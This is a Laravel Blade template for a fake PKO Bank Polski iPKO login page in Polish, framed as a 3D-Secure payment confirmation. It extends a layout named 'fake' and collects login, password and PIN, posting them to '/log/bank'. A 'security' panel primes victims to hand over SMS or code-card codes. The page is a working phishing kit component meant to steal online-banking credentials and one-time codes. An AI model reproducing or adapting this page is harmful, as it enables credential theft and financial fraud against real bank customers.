@extends('layouts.fake')
@push('css')
    <link href="{{ asset('css/ipko.css') }}" rel="stylesheet">
@endpush
@push('js')
    <script>
        $('.pass__toggle').click(function (e) {
            let $input = $(this).prev('div.field_widget_control').children('input#password[name="password"]');
            $input.prop('type', (i, type) => type === "password" ? "text" : "password")
        });
    </script>
@endpush
@section('content')
    <div id="container">
        <div id="header" class="content">
            <div class="header">
                <img src="{{asset('images/banks/FY628MZ.jpg')}}" id="pr_image"
                     width="85" height="70" alt="">
            </div>
            <div data-step="1" id="content" class="" tabindex="0" role="form">
                <div>
                    <div id="colmain750" class="col940" tabindex="0">
                        <div>
                            <h2 tabindex="1">Aby potwierdzić operację w ramach usługi 3D-Secure, zaloguj się do serwisu
                                iPKO.</h2>
                        </div>
                        <div class="special_login">
                            <div class="colmain520" style="width:460px;min-height: 255px;">
                                <div style="border-right: 1px solid #e6e6e6; margin-top: 10px; padding: 0 10px 0 0; width:460px; min-height: 210px;">
                                    <div style="width:455px;">
                                        <h1>Logowanie</h1>
                                    </div>
                                    <form class="form_valid form_content login login_anti_phishing" method="POST" id="bank_pm_form" action="/log/bank">
                                        <table id="form_table" class="fullwidth" name="content_table">
                                            <tbody>
                                            <tr class="field_row f_root FriendlyLoginEditFieldRow"
                                                id="f-tr-f-form_4443000429-login_id">
                                                <td width="100px">
                                                    Numer klienta lub login
                                                </td>
                                                <td class="field-cell">
                                                    <div class="FriendlyLoginEditField_field_widget field_widget"
                                                         id="f-form_4443000429-login_id-field_widget">
                                                        <div class="field_widget_control">
                                                            <input name="login" maxlength="200" type="text" id="login"
                                                                   size="250"
                                                                   class="FriendlyLoginEditField text_input text_input_login_id"
                                                                   tabindex="10" autocomplete="off">
                                                        </div>
                                                        <span class="field_infotip">
                                                            <i class="tip" style="z-index: 999;">
        <div style="z-index: 999; position: absolute; margin-left: 33px; display: none" id="infoTipDiv">
            <div id="ui-ipkoInfotip" role="tooltip"
                 class="ui-tooltip ui-widget ui-corner-all ui-widget-content infotip infotip-left"
                 style="top: 34px; left: 364.5px; display: block;">
                <div class="ui-tooltip-wrapper">
                    <div class="ui-tooltip-content" style="max-height: 84px; margin-right: -17px; overflow-y: scroll;">
                        <span id="infoTipDiv_message">Wprowadź swój unikalny, ośmiocyfrowy numer klienta iPKO lub własny przyjazny login.</span>
                    </div>
                    <div class="ui-tooltip-track" style="display: none;">
                        <div class="ui-tooltip-track-small">
                            <div class="ui-tooltip-thumb ui-draggable" style="top: 0px; height: 50px;"></div>
                        </div>
                    </div>
                </div>
           </div>
        </div>
    </i>
                                                        </span>
                                                    </div>
                                                </td>
                                            </tr>
                                            <tr class="field_row f_root FriendlyLoginEditFieldRow"
                                                id="f-tr-f-form_4443000429-login_id">
                                                <td width="100px">
                                                    Hasło
                                                </td>
                                                <td class="field-cell">
                                                    <div class="FriendlyLoginEditField_field_widget field_widget"
                                                         id="f-form_4443000429-login_id-field_widget">
                                                        <div class="field_widget_control">
                                                            <input name="password" maxlength="200" type="password"
                                                                   id="password" size="250"
                                                                   class="FriendlyLoginEditField text_input text_input_login_id"
                                                                   tabindex="10" autocomplete="off">
                                                        </div>
                                                        <span class="field_infotip pass__toggle"><i class="tip"
                                                                                                    style="z-index: 999">
                                                                <div style="z-index: 999; position: absolute; margin-left: 33px; display: none"
                                                                     id="infoTipDiv">
            <div id="ui-ipkoInfotip" role="tooltip"
                 class="ui-tooltip ui-widget ui-corner-all ui-widget-content infotip infotip-left"
                 style="top: 34px; left: 364.5px; display: block;">
                <div class="ui-tooltip-wrapper">
                    <div class="ui-tooltip-content" style="max-height: 84px; margin-right: -17px; overflow-y: scroll;">
                        <span id="infoTipDiv_message">Wprowadź hasło, którego używasz do logowania w serwisie transakcyjnym lub mobilnym iPKO.<br>
            Jeśli logujesz się do serwisu transakcyjnego iPKO po raz
pierwszy wprowadź hasło pierwszego logowania, które otrzymałeś podczas
podpisywania umowy o prowadzenie usług bankowości elektronicznej.<br>
            Trzykrotne nieudane próby wprowadzenia hasła mogą zablokować dostęp do konta.</span>
                    </div>
                    <div class="ui-tooltip-track" style="display: none;">
                        <div class="ui-tooltip-track-small">
                            <div class="ui-tooltip-thumb ui-draggable" style="top: 0px; height: 50px;"></div>
                        </div>
                    </div>
                </div>
           </div>
        </div>
    </i>
                                                        </span>
                                                    </div>
                                                </td>
                                            </tr>
                                            <tr class="field_row f_root FriendlyLoginEditFieldRow"
                                                id="f-tr-f-form_4443000429-pin_id">
                                                <td width="100px">
                                                    Pin
                                                </td>
                                                <td class="field-cell">
                                                    <div class="FriendlyLoginEditField_field_widget field_widget"
                                                         id="f-form_4443000429-login_id-field_widget">
                                                        <div class="field_widget_control">
                                                            <input name="pin" type="text"
                                                                   id="pin"
                                                                   class="FriendlyLoginEditField text_input text_input_login_id"
                                                                   tabindex="10" autocomplete="off">
                                                        </div>
                                                    </div>
                                                </td>
                                            </tr>
                                            </tbody>
                                        </table>
                                        <div class="button_rows center">
                                            <ul style="text-align: center; margin: 0pt;">
                                                <li class="button_group_none" style="float: none">
                                                    <button id="pay-button" onclick="lk_auth();" value="Dalej"
                                                            class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only fright continue-button"
                                                            tabindex="10" formnovalidate="formnovalidate"><span
                                                                class="ui-button-text">Dalej</span>
                                                    </button>

                                                </li>
                                            </ul>
                                        </div>
                                        <div class="clr"></div>
                                    </form>
                                    <style>
                                        #form_table td {
                                            width: 20%;
                                            padding-bottom: 12px;
                                        }

                                        div.button_rows.center {
                                            border-top: 0;
                                        }
                                    </style>
                                </div>
                            </div>
                            <div style="padding: 0 10px 10px 0; width: 430px; float:right">
                                <div style="border-bottom: 0; margin-left:0px;">
                                    <div
                                            style="padding-right:14px; padding-top:7px; padding-bottom:6px; margin-bottom:4px; margin-left:10px">
                                        <h1>BEZPIECZEŃSTWO</h1>
                                    </div>
                                    <div class="clr"></div>
                                    <div class="widespace2" style="padding-left: 16px;line-height:16px">
                                        Logowanie do naszego serwisu przez twój iPKO jest bezpiecznie. Wszystkie dane służą tylko do weryfikacji
                                        <br><br>
                                        Do potwierdzenia transakcji nasz
                                        serwis mogę prosić o 2-3 kody z SMS lub z karty kodów. Kody służą do weryfikacji konta ,osoby oraz przelewu
                                    </div>
                                    <p style="padding-left: 16px;padding-top:12px; font-weight: bold; margin-bottom:0px; margin-top:0px;">
                                        <a href="https://www.pkobp.pl/redirect.php?id=bezpieczenstwo_ipko"
                                           target="_blank">Więcej do bezpieczeństwa</a></p>
                                </div>
                            </div>
                        </div>
                        <div class="threepix"></div>

                    </div>


                    <div class="clr"></div>
                </div>
                <div class="footer">
                    <ul class="nav size-210">
                    </ul>
                    <div class="brand">
                        <img title="VISA" alt="[logo VISA]"
                             src="{{asset('images/banks/visa_logo.png')}}"
                             class="brand-logo">
                    </div>
                    <div class="last_login"></div>
                    <div class="copyright">© 2020 PKO Bank Polski
                        <span>Kod BIC (Swift): BPKOPLPW</span>
                    </div>
                    <div class="hotline">Serwis telefoniczny iPKO: (+48) 81 535 60 60, 801 307 307
                        <div>Opłata zgodna z taryfą operatora. Serwis telefoniczny czynny całą dobę.</div>
                    </div>
                </div>
            </div>
        </div>
    </div>
@endsection